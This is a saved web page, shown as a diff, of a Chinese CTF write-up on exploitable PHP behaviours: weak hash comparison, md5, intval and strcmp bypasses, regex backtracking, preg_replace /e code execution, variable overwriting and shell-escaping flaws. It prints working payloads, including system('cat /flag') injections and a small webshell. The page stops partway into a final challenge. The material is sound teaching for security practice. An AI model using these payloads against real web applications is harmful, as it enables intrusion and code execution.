@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://www.anquanke.com/post/id/231507 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="renderer" content="webkit">
+<meta name="force-rendering" content="webkit">
+<meta name="referrer" content="always">
+<meta name="description" content="安全客 - 安全资讯平台">
+<link rel="icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon">
+<link rel="shortcut icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon">
+<meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">
+
+  <title>CTF/PHP特性汇总-安全客 - 安全资讯平台</title>
+  <meta name="description" content="安全客 - 安全资讯平台">
+  <meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">
+  <script>(function(window){
+        
+
+function empty() {}
+
+empty();
+      })(this);</script>
+
+<link rel="stylesheet" href="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/d4cec9cd8efbfd10.css">
+<link rel="stylesheet" href="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/a51843d6b82241be,d94674bd62441768,56ce5cef8079a575,8514be0a921ca6e8,4802c0c382205144,8e4464e423fe6849,13c0bf3b0c2e4882,2b3936345af879da,f568b72da28701d3,da046392ff3eccb9,aa4b116b0af3b8cd,e0bfaead3.css">
+<script>window._dynamic_deps_={}</script>
+</head>
+
+<body>
+  <div id="app" data-v-app=""><div class="_9" style="height: 60px;"><div class="g-w"><a class="logo1" href="https://www.anquanke.com/"></a><div class="_10"><div class="item"><div style="cursor: pointer;"><span>首页</span><ul></ul></div></div><div class="item"><div><span>阅读</span><ul><li class="sub-item"><a href="https://www.anquanke.com/news">安全资讯</a></li><li class="sub-item"><a href="https://www.anquanke.com/knowledge">安全知识</a></li><li class="sub-item"><a href="https://www.anquanke.com/tool">安全工具</a></li></ul></div></div><div class="item"><div style="cursor: pointer;"><span>活动</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>招聘</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>安全导航</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>内容精选</span><ul><li class="sub-item"><a href="https://www.anquanke.com/column/index.html">专栏</a></li><li class="sub-item"><a href="https://www.anquanke.com/subject-list">精选专题</a></li><li class="sub-item"><a href="https://www.anquanke.com/discovery">安全客季刊</a></li><li class="sub-item"><a href="https://www.anquanke.com/week-list">360网络安全周报</a></li></ul></div></div></div><div class="_11"><div class="block"><div class="search"><input class="input" placeholder="输入关键词搜索"><button class="button"></button></div><!----><div class="user-href js-login-body" style="display: none;"><div class="user-href-top"><p class="user-avatar-bottom"><img class="user-href-avatar"><!----></p><div class="user-href-top-main"><p class="user-href-grade"></p><p class="user-href-text"><span>累计积分</span><span>可用积分</span></p><p class="user-href-score"><span></span><span></span></p></div></div><ul><li><a href="https://www.anquanke.com/member.html?memberId=undefined">个人主页</a></li><li><a href="https://www.anquanke.com/setting?p=message">我的消息</a></li><li><a href="https://www.anquanke.com/user/set1.html">个人设置</a></li><li><a href="https://www.anquanke.com/user/score/search.html">积分商城</a></li><li>退出登录</li></ul></div><a href="https://www.anquanke.com/login/index.html" class="nologin"></a></div><span class="write"></span><a class="app" href="https://www.anquanke.com/app"><div class="app-img"><img src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t01103704213901dd1e.png"></div></a></div></div></div><div class="index"><div class="index-main"><div class="_55"><h1>CTF/PHP特性汇总</h1><div class="read"><p><span class="read-text">阅读量</span><b class="read-num">269776</b></p><!----><p><span class="read-sep">|</span><img class="read-fee" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t01f942715e2a0f1a23.png"></p></div><p class="publish">发布时间 : 2021-03-15 14:30:04</p><div class="_54" style="display: none;"><b class="close">x</b><h5>译文声明</h5><p> 本文是翻译文章<!----><!----></p><!----><p>译文仅供参考，具体内容表达以及含义原文为准。</p></div><div class="content" id="js-article">
+
+
+<p><img class="alignnone size-full wp-image-234400 aligncenter" alt="" width="720" height="360" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t0156b4ea7a1af8f08b.png"></p>
+<p>&nbsp;</p>
+<h2 name="h2-0" id="h2-0">前言：</h2>
+<p>做CTF题时经常会遇到各种php弱类型和一些函数的绕过方法，由于知识比较零碎，就总结一下我所遇到的，也方便自己以后观看。</p>
+<p>&nbsp;</p>
+<h2 name="h2-1" id="h2-1">0x00:Hash比较缺陷</h2>
+<blockquote><p><code>PHP</code>在处理哈希字符串时，通过<code>!=</code>或<code>==</code>来对哈希值进行比较，它把每一个以<code>0e</code>开头的哈希值都解释为<code>0</code>，所以如果两个不同的密码经过哈希以后，其哈希值都是以<code>0e</code>开头的，那么<code>PHP</code>将会认为他们相同，都是<code>0</code></p></blockquote>
+<p><img class="alignnone size-full wp-image-234337 aligncenter" alt="" width="493" height="191" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t0164f4d3638edfd342.png"></p>
+<p>审计代码，我们输入的不能相等，但<code>md5</code>却需要相等，这明显的就是利用<code>Hash</code>的比较缺陷来做</p>
+<p>我们只要找出两个数再<code>md5</code>加密后都为<code>0e</code>开头的即可，常用的有以下几种</p>
+<pre><code class="lang-c hljs language-c">QNKCDZO
+<span class="hljs-number">0e830400451993494058024219903391</span>
+s878926199a
+<span class="hljs-number">0e545993274517709034328855841020</span>
+s155964671a
+<span class="hljs-number">0e342768416822451524974117254469</span>
+s214587387a
+<span class="hljs-number">0e848240448830537924465865611904</span>
+s214587387a
+<span class="hljs-number">0e848240448830537924465865611904</span>
+s878926199a
+<span class="hljs-number">0e545993274517709034328855841020</span>
+s1091221200a
+<span class="hljs-number">0e940624217856561557816327384675</span>
+</code></pre>
+<p>所以构造<code>a=QNKCDZO&amp;b=s878926199a</code>即可绕过</p>
+<p>&nbsp;</p>
+<h2 name="h2-2" id="h2-2">0x01:md5</h2>
+<h4 id="h4--md5-">
+<a class="reference-link" name="%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9Amd5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"></a>第一种：md5函数绕过</h4>
+<blockquote><p>一、<code>md5()</code>函数获取不到数组的值，默认数组为0<br>
+二、<code>sha1()</code>函数无法处理数组类型，将报错并返回false</p></blockquote>
+<p><img class="size-full wp-image-234338 aligncenter" alt="" width="571" height="320" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t0155a47be34a8f7084.png"></p>
+<p>payload：</p>
+<pre><code class="lang-c hljs language-c">name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span>
+</code></pre>
+<p><img class="alignnone size-full wp-image-234340 aligncenter" alt="" width="595" height="224" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t01d85d82a74fb3d21f.png"></p>
+<p>注意这里是<code>===</code>，不是<code>==</code>，所以这里采用<code>md5()</code>函数获取不到数组的值，默认数组为0这个特性来做，payload:</p>
+<pre><code class="lang-c hljs language-c">username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span>
+</code></pre>
+<h4 id="h4--md5-">
+<a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9Amd5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"></a>第二种：md5强类型绕过</h4>
+<pre><code class="lang-cpp hljs language-cpp">(string)$_POST[<span class="hljs-string">'a1'</span>]!==(string)$_POST[<span class="hljs-string">'a2'</span>]
+ &amp;&amp; <span class="hljs-built_in">md5</span>($_POST[<span class="hljs-string">'a1'</span>])===<span class="hljs-built_in">md5</span>($_POST[<span class="hljs-string">'a2'</span>])}
+</code></pre>
+<p>例如这段代码，使用数组就不可行，因为最后转为字符串进行比较，所以只能构造两个MD5值相同的不同字符串.<br><img alt="" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/1613553900781-02d9a72a-56b9-493d-b28b-e448258a7bb4.png"><br>
+两组经过url编码后的值</p>
+<pre><code class="lang-cpp hljs language-cpp">#<span class="hljs-number">1</span>
+a=M%C9h%FF%<span class="hljs-number">0</span>E%E3%<span class="hljs-number">5</span>C%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>r%D4w%<span class="hljs-number">7B</span>r%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%D3o%A7%B2%<span class="hljs-number">1B</span>%DCV%B7J%<span class="hljs-number">3</span>D%C0x%<span class="hljs-number">3</span>E%<span class="hljs-number">7B</span>%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%AF%BF%A2%<span class="hljs-number">00</span>%A8%<span class="hljs-number">28</span>K%F3n%<span class="hljs-number">8</span>EKU%B3_Bu%<span class="hljs-number">93</span>%D8Igm%A0%D1U%<span class="hljs-number">5</span>D%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%FB_%<span class="hljs-number">07</span>%FE%A2
+b=M%C9h%FF%<span class="hljs-number">0</span>E%E3%<span class="hljs-number">5</span>C%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>r%D4w%<span class="hljs-number">7B</span>r%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%D3o%A7%B2%<span class="hljs-number">1B</span>%DCV%B7J%<span class="hljs-number">3</span>D%C0x%<span class="hljs-number">3</span>E%<span class="hljs-number">7B</span>%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%AF%BF%A2%<span class="hljs-number">02</span>%A8%<span class="hljs-number">28</span>K%F3n%<span class="hljs-number">8</span>EKU%B3_Bu%<span class="hljs-number">93</span>%D8Igm%A0%D1%D5%<span class="hljs-number">5</span>D%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%FB_%<span class="hljs-number">07</span>%FE%A2
+#<span class="hljs-number">2</span>
+a=%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7b</span>%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6f</span>%a7%b2%<span class="hljs-number">1b</span>%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7b</span>%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">00</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4b</span>%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4b</span>%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5f</span>%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5f</span>%<span class="hljs-number">07</span>%fe%a2
+b=%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7b</span>%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6f</span>%a7%b2%<span class="hljs-number">1b</span>%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7b</span>%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%
+</code></pre>
+<p>&nbsp;</p>
+<h2 name="h2-3" id="h2-3">0x03:intval函数绕过</h2>
+<h4 id="h4--">
+<a class="reference-link" name="%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A"></a>第一个特性：</h4>
+<p><img class="alignnone size-full wp-image-234341 aligncenter" alt="" width="1060" height="160" src="https://p3.ssl.qhimg.com/t01c68c908123b9d616.png"></p>
+<h4 id="h4--">
+<a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A"></a>第二个特性：</h4>
+<p><img class="alignnone size-full wp-image-234342 aligncenter" alt="" width="1017" height="516" src="https://p0.ssl.qhimg.com/t01ad9612f4b2ba7d98.png"></p>
+<p>例如：</p>
+<p><img class="alignnone size-full wp-image-234343 aligncenter" alt="" width="599" height="246" src="https://p2.ssl.qhimg.com/t01d70e23bf06a45737.png"></p>
+<p>payload如下:</p>
+<pre><code class="lang-python hljs language-python">?num=<span class="hljs-number">0x117c</span>
+?num=010574
+</code></pre>
+<p>除此之外，这个函数还可以使用小数点来进行操作</p>
+<p><img class="alignnone size-full wp-image-234344 aligncenter" alt="" width="1203" height="212" data-original="https://p2.ssl.qhimg.com/t01f625151f9faa6888.png"></p>
+<h4 id="h4--">
+<a class="reference-link" name="%E7%AC%AC%E4%B8%89%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A"></a>第三个特性：</h4>
+<blockquote><p>如果$base为0直到遇上数字或正负符号才开始做转换，在遇到非数字或字符串结束时(\0)结束转换，但前提是进行弱类型比较</p></blockquote>
+<p>例如：</p>
+<p><img class="alignnone size-full wp-image-234345 aligncenter" alt="" width="627" height="306" data-original="https://p3.ssl.qhimg.com/t0135b53eb67f64d71e.png"></p>
+<p>payload：</p>
+<pre><code class="lang-python hljs language-python">?num=<span class="hljs-number">4476e1</span>
+</code></pre>
+<p>&nbsp;</p>
+<h2 name="h2-4" id="h2-4">0x04:preg_match函数绕过</h2>
+<h4 id="h4--m">
+<a class="reference-link" name="%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9A/m"></a>第一种：/m</h4>
+<pre><code class="lang-python hljs language-python"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/^php$/im'</span>,$a))
+</code></pre>
+<blockquote><p>/m 多行匹配，但是当出现换行符 <code>%0a</code>的时候，会被当做两行处理，而此时只可以匹配第 1 行，后面的行就会被忽略。</p></blockquote>
+<h4 id="h4--">
+<a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87"></a>第二种：回溯绕过</h4>
+<p><img class="alignnone size-full wp-image-234346 aligncenter" alt="" width="657" height="424" data-original="https://p5.ssl.qhimg.com/t015da8669f4ac0b351.png"></p>
+<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit,可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限</p>
+<p><img class="alignnone size-full wp-image-234347 aligncenter" alt="" width="539" height="80" data-original="https://p2.ssl.qhimg.com/t01d245b92559eea0e3.png"></p>
+<p>回溯次数上限默认是100万,如果回溯次数超过了100万，preg_match返回的<strong>便不再是0或1，而是false</strong>，利用这个方法，可以写一个脚本，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF</p>
+<pre><code class="lang-groovy">import requests
+
+url = 'http://3638bf4e-f63d-477c-95eb-ba023f279de8.chall.ctf.show:8080/'
+
+data = {
+    'f':'very'*250000+'ctfshow'
+}
+
+reponse = requests.post(url,data=data)
+
+print(reponse.text)
+</code></pre>
+<p>&nbsp;</p>
+<h2 name="h2-5" id="h2-5">0x05: preg_replace /e 模式下的代码执行</h2>
+<p><img class="alignnone size-full wp-image-234348 aligncenter" alt="" width="1294" height="425" data-original="https://p4.ssl.qhimg.com/t01cd8d104a8b563d8a.png"></p>
+<blockquote><p>/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行</p></blockquote>
+<p><strong>ZJCTF，不过如此</strong></p>
+<pre><code class="lang-cpp hljs language-cpp">&lt;?php
+$id = $_GET[<span class="hljs-string">'id'</span>];
+$_SESSION[<span class="hljs-string">'id'</span>] = $id;
+
+<span class="hljs-function">function <span class="hljs-title">complex</span><span class="hljs-params">($re, $str)</span> </span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">preg_replace</span>(
+        <span class="hljs-string">'/('</span> . $re . <span class="hljs-string">')/ei'</span>,
+        <span class="hljs-string">'strtolower("\\1")'</span>,
+        $str
+    );
+}
+
+foreach($_GET as $re =&gt; $str) {
+    <span class="hljs-function">echo <span class="hljs-title">complex</span><span class="hljs-params">($re, $str)</span>. "\n"</span>;
+}
+<span class="hljs-function">function <span class="hljs-title">getFlag</span><span class="hljs-params">()</span></span>{
+    @<span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]);
+}
+</code></pre>
+<p>这里的代码便涉及到了preg_replace /e 模式下的代码执行，原理的话师傅讲的很明白，这里不再叙述</p>
+<p><strong>直接放payload：</strong></p>
+<pre><code class="lang-cpp hljs language-cpp">\S*=${<span class="hljs-built_in">phpinfo</span>()}
+</code></pre>
+<p><img class="alignnone size-full wp-image-234349 aligncenter" alt="" width="1375" height="485" data-original="https://p0.ssl.qhimg.com/t016432685abfce5d2f.png"></p>
+<p><strong>得到flag</strong></p>
+<pre><code class="lang-cpp hljs language-cpp">?\S*=${<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">getFlag</span>())}&amp;cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">'cat /flag'</span>);
+#最后的分号要加，除此之外，也可以：
+?\S*=${<span class="hljs-built_in">eval</span>($_POST[lemon])}
+#POST DATA
+lemon=<span class="hljs-built_in">system</span>(<span class="hljs-string">'cat /flag'</span>);
+</code></pre>
+<p><img class="alignnone size-full wp-image-234350 aligncenter" alt="" width="934" height="333" data-original="https://p2.ssl.qhimg.com/t01fa65cf3135bc7a30.png"></p>
+<p>&nbsp;</p>
+<h2 name="h2-6" id="h2-6">0x06：in_array宽松比较</h2>
+<p>in_array函数有一个特性<strong>，</strong>如果不设置第三个参数将使用宽松的比较</p>
+<p><img class="alignnone size-full wp-image-234351 aligncenter" alt="" width="1130" height="467" data-original="https://p3.ssl.qhimg.com/t01124a33dda1017691.png"></p>
+<p>可以在本地测试一下</p>
+<p><img class="alignnone size-full wp-image-234352 aligncenter" alt="" width="973" height="266" data-original="https://p5.ssl.qhimg.com/t0188fed245ee5ffe16.png"></p>
+<p>例如这道题：</p>
+<p><img class="alignnone size-full wp-image-234353 aligncenter" alt="" width="831" height="259" data-original="https://p0.ssl.qhimg.com/t01ddee9dbe4fec596b.png"></p>
+<p>上面的代码对下面无影响，直接写webshell即可，但是要注意文件名开头必须是以数字开头的</p>
+<pre><code class="lang-groovy">?n=1.php
+DATA:
+content=&lt;?php system('cat *.php');?&gt;
+</code></pre>
+<p>&nbsp;</p>
+<h2 name="h2-7" id="h2-7">0x07:变量覆盖</h2>
+<h4 id="h4--extract-parse_str-">
+<a class="reference-link" name="%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9Aextract%E5%87%BD%E6%95%B0%E3%80%81parse_str%E5%87%BD%E6%95%B0"></a>第一种：extract函数、parse_str函数</h4>
+<blockquote><p><code>extract()</code> 函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<strong>数组键值</strong>作为<strong>变量值</strong>，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖</p></blockquote>
+<p><img class="alignnone size-full wp-image-234354 aligncenter" alt="" width="578" height="194" data-original="https://p5.ssl.qhimg.com/t019c197edf2a17fb3b.png"></p>
+<p><code>POST</code>方法传输进来的值通过<code>extrace()</code>函数处理，直接传入以<code>POST</code>的方式传入<code>pass=1&amp;thepassword_123=1</code>就可以进行将原本的变量覆盖，并且使两个变量相等即可。</p>
+<p>还有就是这两个函数如果结合起来使用，也会造成变量覆盖</p>
+<p><img class="alignnone size-full wp-image-234355 aligncenter" alt="" width="940" height="310" data-original="https://p2.ssl.qhimg.com/t01ee4693c210d149c7.png"></p>
+<p>代码中同时含有<code>parse_str和extract($_POST)</code>可以先将GET方法请求的解析成变量，然后再利用extract() 函数从数组中将变量导入到当前的符号表,故payload为：</p>
+<pre><code class="lang-groovy">?_POST[key1]=36d&amp;_POST[key2]=36d
+</code></pre>
+<h4 id="h4--">
+<a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A%24%24%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"></a>第二种：$$变量覆盖</h4>
+<p>$$变量覆盖要具体结合代码来看，可能会需要借助<strong>某个参数进行传递值</strong>，也有可能使用<strong>$GLOBALS（引用全局作用域中可用的全部变量）</strong>来做题，例如：</p>
+<p><img class="alignnone size-full wp-image-234356 aligncenter" alt="" width="923" height="478" data-original="https://p3.ssl.qhimg.com/t0167fa970a0ffb85c8.png"></p>
+<p>这道题便需要借助某个参数进行传递值，具体也不详细说明了，payload如下：</p>
+<pre><code class="lang-python hljs language-python">?Sn0w=flag
+DATA:
+error=Sn0w
+实际在代码中为
+GET:
+$Sn0w=$flag
+POST:
+$error=$Sn0w
+</code></pre>
+<p>&nbsp;</p>
+<h2 name="h2-8" id="h2-8">0x08:通过数组绕过</h2>
+<h4 id="h4-ereg-">
+<a class="reference-link" name="ereg()%E5%87%BD%E6%95%B0"></a>ereg()函数</h4>
+<p><img class="alignnone size-full wp-image-234357 aligncenter" alt="" width="1151" height="324" data-original="https://p4.ssl.qhimg.com/t0180b27e3648257454.png"></p>
+<blockquote><p>一、ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。<br>
+二、ereg()只能处理字符串的，遇到数组做参数返回NULL。<br>
+三、空字符串的类型是<code>string</code>，<code>NULL</code>的类型是<code>NULL</code>,<code>false、true</code>是<code>boolean</code>类型</p></blockquote>
+<h4 id="h4-strpos-">
+<a class="reference-link" name="strpos()%E5%87%BD%E6%95%B0"></a>strpos()函数</h4>
+<p><img class="alignnone size-full wp-image-234358 aligncenter" alt="" width="1127" height="400" data-original="https://p2.ssl.qhimg.com/t01a4d9fbc942782a37.png"></p>
+<blockquote><p>strpos()函数如果传入数组，便会返回NULL</p></blockquote>
+<h4 id="h4-strcmp-">
+<a class="reference-link" name="strcmp()%E5%87%BD%E6%95%B0"></a>strcmp()函数</h4>
+<p><code>strcmp()</code>函数比较两个字符串(区分大小写）,定义中是比较<strong>字符串类型</strong>的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在<code>php 5.2</code>版本之前，利用<code>strcmp</code>函数将数组与字符串进行比较会返回<code>-1</code>，但是从<code>5.3</code>开始，会返回<code>0</code>。</p>
+<p><img class="alignnone size-full wp-image-234359 aligncenter" alt="" width="572" height="342" data-original="https://p2.ssl.qhimg.com/t018d3fcb5df94910fc.png"></p>
+<p>payload:</p>
+<pre><code class="lang-php hljs language-php"><span class="hljs-comment">#POST DATA</span>
+pass[]=<span class="hljs-number">1</span>
+</code></pre>
+<p>数组和字符进行比较结果不会返回<code>1</code>，即为<code>false</code>,加上非的作用，即可变成<code>true</code>,则满足条件</p>
+<p>&nbsp;</p>
+<h2 name="h2-9" id="h2-9">0x09：PHP自身特性</h2>
+<h4 id="h4-php-">
+<a class="reference-link" name="PHP%E7%9A%84%E5%8F%98%E9%87%8F%E5%90%8D%E6%A0%BC%E5%BC%8F"></a>PHP的变量名格式</h4>
+<p><strong>在CTF中也经常考察PHP的变量名格式，例如这道题：</strong></p>
+<p><img class="alignnone size-full wp-image-234360 aligncenter" alt="" width="1055" height="295" data-original="https://p4.ssl.qhimg.com/t014ac57dd428b280c6.png"></p>
+<p><code>$_POST['CTF_SHOW.COM']</code>无法传入参数，这是因为PHP变量名应该只有<strong>数字字母下划线。</strong>而且GET或POST方式传进去的变量名,会自动将<code>**空格**</code> <code>+ . [</code>转换为<code>_</code></p>
+<p>payload:</p>
+<pre><code class="lang-cpp hljs language-cpp">DATA:
+CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>
+</code></pre>
+<h4 id="h4-php-">
+<a class="reference-link" name="PHP%E6%95%B0%E5%AD%97%E5%8F%AF%E4%B8%8E%E5%AD%97%E7%AC%A6%E5%81%9A%E8%BF%90%E7%AE%97"></a>PHP数字可与字符做运算</h4>
+<p><img class="alignnone size-full wp-image-234361 aligncenter" alt="" width="1894" height="544" data-original="https://p1.ssl.qhimg.com/t01f32767c97ad68dfe.png"></p>
+<p>&nbsp;</p>
+<h2 name="h2-10" id="h2-10">0x10：escapeshellarg&amp;escapeshellcmd函数绕过</h2>
+<p>模仿师傅的例子进行学习<br><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">谈谈escapeshellarg参数绕过和注入的问题</a></p>
+<p><strong>escapeshellarg</strong></p>
+<p><img class="alignnone size-full wp-image-234362 aligncenter" alt="" width="1348" height="466" data-original="https://p0.ssl.qhimg.com/t0138ca46921ef8b5d9.png"></p>
+<p><strong>escapeshellcmd</strong></p>
+<p><img class="alignnone size-full wp-image-234363 aligncenter" alt="" width="1312" height="490" data-original="https://p0.ssl.qhimg.com/t0140e2566232377e3e.png"></p>
+<p>先通过例子来查看一下<strong>escapeshellarg</strong>函数的作用吧</p>
+<pre><code class="lang-cpp hljs language-cpp">&lt;?<span class="hljs-function">php 
+<span class="hljs-title">var_dump</span><span class="hljs-params">(escapeshellarg(<span class="hljs-string">"123"</span>))</span></span>;
+<span class="hljs-built_in">var_dump</span>(<span class="hljs-built_in">escapeshellarg</span>(<span class="hljs-string">"12'     3"</span>));
+?&gt;
+</code></pre>
+<p><img class="alignnone size-full wp-image-234364 aligncenter" alt="" width="1383" height="182" data-original="https://p5.ssl.qhimg.com/t0135e9bd6c4f45f74f.png"></p>
+<p>在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</p>
+<p><img class="alignnone size-full wp-image-234365 aligncenter" alt="" width="382" height="188" data-original="https://p1.ssl.qhimg.com/t01ac3e22180a668caf.png"></p>
+<p>所以即使参数用了 <strong>escapeshellarg</strong> 函数过滤单引号，但参数在拼接命令的时候如果用了双引号的话还是会导致命令执行的漏洞。</p>
+<p>再来看一下<strong>escapeshellcmd</strong> 函数的作用</p>
+<p><img class="alignnone size-full wp-image-234366 aligncenter" alt="" width="445" height="144" data-original="https://p4.ssl.qhimg.com/t011c090c3652b7e746.png"></p>
+<p>两个函数都会对单引号进行处理，但是有区别的,如下：</p>
+<p><img class="alignnone size-full wp-image-234367 aligncenter" alt="" width="864" height="191" data-original="https://p5.ssl.qhimg.com/t01a632f970782dadc5.png"></p>
+<p>对于单个单引号, <strong>escapeshellarg</strong> 函数转义后,还会在左右各加一个单引号,但 <strong>escapeshellcmd</strong> 函数是直接加一个转义符，对于成对的单引号, <strong>escapeshellcmd</strong> 函数默认不转义,但 <strong>escapeshellarg</strong> 函数转义</p>
+<p>那既然有这个差异，如果<strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 一起出现会有什么问题<br><strong>测试</strong></p>
+<p><img class="alignnone size-full wp-image-234368 aligncenter" alt="" width="732" height="240" data-original="https://p1.ssl.qhimg.com/t01b0dbc77d63d0ef1e.png"></p>
+<p><strong>结果</strong></p>
+<p><img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t01ce491028baf76639.png"></p>
+<p><strong>分析</strong></p>
+<pre><code class="lang-cpp hljs language-cpp">一开始传入的参数
+<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1'</span> -v -d a=<span class="hljs-number">1</span>
+经过escapeshellarg函数处理，先转义再用单引号括起来
+<span class="hljs-string">'127.0.0.1'</span>\<span class="hljs-string">'' -v -d a=1'</span>
+再经过escapeshellcmd函数处理，数中的\以及a=<span class="hljs-number">1'</span>中的单引号进行处理转义
+<span class="hljs-string">'127.0.0.1'</span>\\<span class="hljs-string">'' -v -d a=1\'</span>
+由于这一步的处理，使得\\被解释成了\而不再是转义字符，所以单引号配对连接之后将语句分割为三个部分
+</code></pre>
+<p><img class="alignnone size-full wp-image-234369 aligncenter" alt="" width="496" height="77" data-original="https://p4.ssl.qhimg.com/t01ebfca559b87ec852.png"></p>
+<p>因此最后system函数是对<code>127.0.0.1\</code>发起请求，POST 数据为<code>a=1'</code>，如果两个函数翻过来则不会出现这个问题</p>
+<p><img class="alignnone size-full wp-image-234370 aligncenter" alt="" width="1401" height="190" data-original="https://p3.ssl.qhimg.com/t012e569564b9d49eaa.png"></p>
+<p>接下来就通过一个题目来实践一下：</p>
+<p><strong>Online Tool</strong></p>
+<p><img class="alignnone size-full wp-image-234371 aligncenter" alt="" width="612" height="330" data-original="https://p3.ssl.qhimg.com/t010c440a000cbf9991.png"></p>
